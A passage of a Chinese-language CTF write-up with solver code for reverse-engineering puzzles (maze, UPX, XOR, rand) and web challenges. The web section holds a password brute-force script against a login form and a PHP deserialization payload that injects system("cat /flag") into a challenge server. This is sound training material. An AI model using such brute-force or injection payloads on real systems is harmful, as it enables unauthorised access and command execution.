<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">random</span>
<span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">t</span> <span class="o">=</span> <span class="s1">&#39;I__********___********_********_*_********_********_*_******___********_*__*****_**********_**_*****________***_**___**********_____****__*******************E**&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="p">),</span><span class="mi">20</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">20</span><span class="p">])</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s1">&#39;ddsssaassdddddddsddddwwwwwwddsssdssddsds&#39;</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">==</span><span class="mi">100</span><span class="p">:</span>  <span class="c1">#</span>
        <span class="n">k</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">elif</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">115</span><span class="p">:</span>
            <span class="n">k</span><span class="o">+=</span><span class="mi">20</span>
        <span class="k">elif</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">119</span><span class="p">:</span>
            <span class="n">k</span><span class="o">-=</span><span class="mi">20</span>
    <span class="k">elif</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">97</span><span class="p">:</span>
        <span class="n">k</span><span class="o">-=</span><span class="mi">1</span>

<span class="k">print</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="p">[(</span><span class="mi">20</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">k</span> <span class="o">/</span> <span class="mi">20</span><span class="p">))</span> <span class="o">+</span> <span class="n">k</span> <span class="o">%</span> <span class="mi">20</span><span class="p">])</span> 
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="upx"></a><h3>upx</h3>
<p>直接工具脱壳，然后查看脱壳程序</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;KWPP~uoigkTutj|103na&#39;</span>
<span class="n">str1</span><span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
    <span class="n">str1</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">^</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">str1</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="rand"></a><h3>rand</h3>
<p>ida出来，根据反汇编，写C++程序，直接出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C++" data-lang="C++"><span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">v5</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">c</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;_XEXvNzcuAX`N_{hnQ|mb9u&#34;</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="kt">int</span> <span class="n">v3</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">22</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
		<span class="n">v3</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
		 <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">-</span> <span class="mi">26</span> <span class="o">*</span> <span class="p">(((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="mi">1321528399LL</span> <span class="o">*</span> <span class="n">v3</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">));</span>
		 <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">c</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
		 <span class="n">cout</span><span class="o">&lt;&lt;*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
	<span class="p">}</span>
	
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	
<span class="p">}</span> 
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="flag-game"></a><h3>Flag Game</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">
a1 = &#39;NPVQIWcZRMQLZ]KWZVAAIVZCKK@#z&#39;


str = &#39;&#39;   #28 
# 1. v2 输入: str[ord(&#39;str[0]&#39;) - 12])!=0 , v17 = len(str)
# 2. v4 不能有回车                          a2 = 29
# 3. for (i =0; 28+1 &gt; i; ++i)
#        v10[i] = str[i] ^ (str[i]&gt;&gt;4)          !str[i] &gt;&gt; 4  == str[i+1]
# 4. v10[len(str)] == v[17] &amp;&amp; a2 - 1 == len(str)


#  v10[28] = z
for i in a1:
    for j in range(137):
        if j^ (j&gt;&gt;4) == ord(i):
            str += chr(j)
print(str)      
#JUSTMRe_WITH_XOR_SEEMS_GOOD!}
出来结果稍微有些不对劲，略微改一改。
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="re最终考核题-reverse-final-test"></a><h3>Re最终考核题 (Reverse Final Test)</h3>
<p>最重要的function2， 取余，设常数<code>j</code>，然后从里面调一个</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">function2</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="n">sa</span> <span class="o">=</span> <span class="n">s</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="o">&lt;=</span><span class="mi">64</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">s</span><span class="o">&gt;</span><span class="mi">90</span><span class="p">):</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="o">&gt;</span><span class="mi">96</span> <span class="ow">and</span> <span class="n">s</span><span class="o">&lt;=</span><span class="mi">122</span><span class="p">):</span>
            <span class="n">sa</span> <span class="o">=</span> <span class="p">((</span><span class="n">s</span><span class="o">^</span><span class="mh">0x20</span><span class="p">)</span><span class="o">-</span><span class="mi">60</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span> <span class="o">+</span><span class="mi">65</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sa</span> <span class="o">=</span> <span class="p">((</span><span class="n">s</span><span class="o">^</span><span class="mh">0x20</span><span class="p">)</span><span class="o">-</span><span class="mi">92</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span> <span class="o">+</span><span class="mi">97</span>
    <span class="k">return</span> <span class="n">sa</span>
<span class="k">def</span> <span class="nf">function3</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span> <span class="o">==</span> <span class="n">flag</span>
<span class="k">def</span> <span class="nf">function1</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">h</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">51</span><span class="p">):</span>
        <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">l</span><span class="o">&lt;=</span><span class="mi">50</span><span class="p">):</span>
        <span class="n">flag</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">=</span> <span class="n">function2</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">l</span><span class="p">])</span>
        <span class="n">l</span><span class="o">+=</span><span class="mi">1</span>
    <span class="k">while</span> <span class="n">h</span><span class="o">&lt;=</span><span class="mi">50</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">function3</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">h</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="n">h</span><span class="p">]):</span>
            <span class="n">m</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">h</span><span class="o">+=</span><span class="mi">1</span>
    <span class="k">return</span> <span class="n">h</span>
<span class="k">def</span> <span class="nf">main1</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="k">pass</span>
<span class="s1">&#39;&#39;&#39;
</span><span class="s1">    while (j &lt;= 50 and function3(flag[j],s[j])):
</span><span class="s1">        h+=1
</span><span class="s1">        j+=1
</span><span class="s1">&#39;&#39;&#39;</span>
    
<span class="n">s</span><span class="o">=</span><span class="p">[</span><span class="mi">87</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">115</span><span class="p">]</span>
<span class="n">str1</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
    <span class="n">str1</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">str1</span><span class="p">)</span>
<span class="c1">#1. 先对flag每一个值进行 与 i+1异或，然后想加</span>
<span class="c1">#2. flag的每一个值， flag[i]</span>
<span class="c1">#          if flag[i] &lt;=64 || flag[i]&gt;90:</span>
<span class="c1">#                if  96&lt; flag[i]&lt;122</span>
<span class="c1">#                       flag[i] = ((flag[i]^0x20) - 60) %26+ 65</span>
<span class="c1">#          else:</span>
<span class="c1">#                flag[i] = ((flag[i]^0x20) - 92) % 26 + 97</span>
<span class="c1">#3. 对于flag的每一个值与s相比，相等加一， 最后值等于 flag[i] 中 0第一次出现的位置</span>
<span class="n">tmp</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">str2</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="p">(((</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">65</span><span class="p">)</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="mi">26</span><span class="p">)</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span><span class="o">^</span> <span class="mh">0x20</span>
        <span class="n">tmp2</span> <span class="o">=</span> <span class="p">(((</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">97</span><span class="p">)</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="mi">26</span><span class="p">)</span> <span class="o">+</span> <span class="mi">92</span><span class="p">)</span><span class="o">^</span> <span class="mh">0x20</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;</span> <span class="mi">90</span><span class="p">):</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;</span> <span class="mi">96</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">tmp</span><span class="o">&lt;=</span><span class="mi">122</span><span class="p">):</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="p">((</span><span class="n">tmp</span><span class="o">^</span><span class="mh">0x20</span><span class="p">)</span><span class="o">-</span><span class="mi">60</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span><span class="o">+</span><span class="mi">65</span><span class="p">):</span>
                    <span class="n">str2</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)))</span>
                    <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="p">((</span><span class="n">tmp2</span><span class="o">^</span><span class="mh">0x20</span><span class="p">)</span><span class="o">-</span><span class="mi">92</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span><span class="o">+</span><span class="mi">97</span><span class="p">):</span>
                <span class="n">str2</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)))</span>
                <span class="k">break</span>
            <span class="n">str2</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span>
        <span class="c1">#str2.append((i,j,chr(s[i])))</span>
<span class="s1">&#39;&#39;&#39;
</span><span class="s1">        if (s[i] == ((tmp2^0x20)-92)%26+97):
</span><span class="s1">                    print(tmp)  
</span><span class="s1">                    str2.append((i,j,chr(tmp)))
</span><span class="s1">                    break
</span><span class="s1">        
</span><span class="s1">        else:
</span><span class="s1">            str2.append((i,j,chr(s[i])))
</span><span class="s1">
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="c1">#snert{How_P0H3rFnL_YPU_arE_Y0_find_This_HiddeN_OUt}</span>
 
<span class="k">print</span><span class="p">(</span><span class="n">str2</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str2</span><span class="p">))</span>
<span class="n">str3</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="n">str4</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="s1">&#39;&#39;&#39;
</span><span class="s1">for i in str2:
</span><span class="s1">    str4 += i[2]
</span><span class="s1">print(str4)
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">str2</span><span class="p">:</span>
    <span class="n">str3</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="p">((</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span>

<span class="c1">#for i in range(len(str2)):</span>
<span class="c1">#    str3 += chr(ord(str2[i][2]) ^ (i+1))</span>
<span class="k">print</span><span class="p">(</span><span class="n">str3</span><span class="p">[:])</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str3</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">function1</span><span class="p">([</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">str3</span><span class="p">]))</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="web"></a><h2>Web</h2>
<a class="post-dummy-target" id="welcome"></a><h3>Welcome</h3>
<p>打开题目链接，f12 发现注释中有flag</p>
<a class="post-dummy-target" id="ez_blast"></a><h3>EZ_blast</h3>
<p>根据index.php 的响应头发现 base64 编码, 解出来是 hint.php</p>
<p>访问 得到 password.txt</p>
<p>开始爆破</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://120.79.25.56:30013/&#39;</span>


<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;password.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="nb">str</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;Admin&#39;</span><span class="p">,</span><span class="s1">&#39;username&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">]:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">j</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span> <span class="p">:</span> <span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">25</span><span class="p">])</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">25</span><span class="p">]</span><span class="o">==</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;账号或密码错误&#39;);&#34;</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;成功&#39;</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>


</code></pre></td></tr></table>
</div>
</div><p>JUST{bp_is_useful}</p>
<a class="post-dummy-target" id="ez_pop"></a><h3>EZ_pop</h3>
<p>反序列化，百度搜索相关结构，构造payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python">
<span class="kn">import</span> <span class="nn">requests</span>


<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://106.75.214.10:9993/index.php&#39;</span>

<span class="n">order</span> <span class="o">=</span> <span class="s1">&#39;system(&#34;cat /flag&#34;);&#39;</span>
<span class="n">num</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">order</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;shana&#39;</span><span class="p">:</span><span class="s1">&#39;O:3:&#34;Pop&#34;:2:{s:5:&#34;shana&#34;;s:4:&#34;yyds&#34;;s:3:&#34;cmd&#34;;s:</span><span class="si">%d</span><span class="s1">:&#34;</span><span class="si">%s</span><span class="s1">&#34;;};&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">order</span><span class="p">)}</span>

<span class="c1">#O:3:&#34;Pop&#34;:2:{s:5:&#34;shana&#34;;s:4:&#34;yyds&#34;;s:3:&#34;cmd&#34;;s:%d:&#34;%s&#34;;};</span>
<span class="c1"># O:4:&#34;data&#34;:2:{s:8:&#34;username&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:8:&#34;password&#34;};</span>
<span class="c1">#a:2:{s:8:&#34;username&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:8:&#34;password&#34;;};</span>
<span class="c1">#a:2:{s:4:&#34;tool&#34;;s:15:&#34;php unserialize&#34;;s:6:&#34;author&#34;;s:13:&#34;w3cSchool.com&#34;;}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
